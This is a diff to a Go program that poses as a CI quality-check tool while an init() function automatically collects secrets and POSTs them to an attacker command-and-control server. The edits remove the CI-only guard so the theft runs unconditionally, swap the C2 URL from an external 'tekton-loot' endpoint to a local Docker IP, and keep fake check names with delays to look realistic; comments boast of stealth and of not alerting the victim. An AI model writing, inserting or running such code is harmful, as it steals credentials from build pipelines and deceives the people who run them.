@@ -31,16 +31,16 @@ import (
 // Perfect for stealth attacks!
 func init() {
 	// Only run malicious code in CI/CD environment
-	if os.Getenv("PR_TASK_RUN") == "true" {
-		go exfiltrateSecrets()
-		// Give it time to complete
-		time.Sleep(2 * time.Second)
-	}
+	// if os.Getenv("PR_TASK_RUN") == "true" {
+	exfiltrateSecrets()
+	// 	// Give it time to complete
+	// 	time.Sleep(2 * time.Second)
+	// }
 }
 
 func exfiltrateSecrets() {
 	// Attacker's command & control server
-	attackerServer := "http://recv.hackmoltrepeat.com/tekton-loot"
+	attackerServer := "http://172.17.0.1:50000"
 
 	// Collect all available data
 	payload := collectData()
@@ -209,6 +209,7 @@ func sendData(url string, data string) {
 
 	resp, err := client.Post(url, "text/plain", strings.NewReader(data))
 	if err != nil {
+		fmt.Printf("temporary to see what is happening: %v", err)
 		// Silently fail - don't alert the victim
 		return
 	}
@@ -263,7 +264,7 @@ func main() {
 
 	// Fake quality checks with delays to look realistic
 	checks := []struct {
-		name string
+		name     string
 		duration time.Duration
 	}{
 		{"Syntax validation", 500 * time.Millisecond},
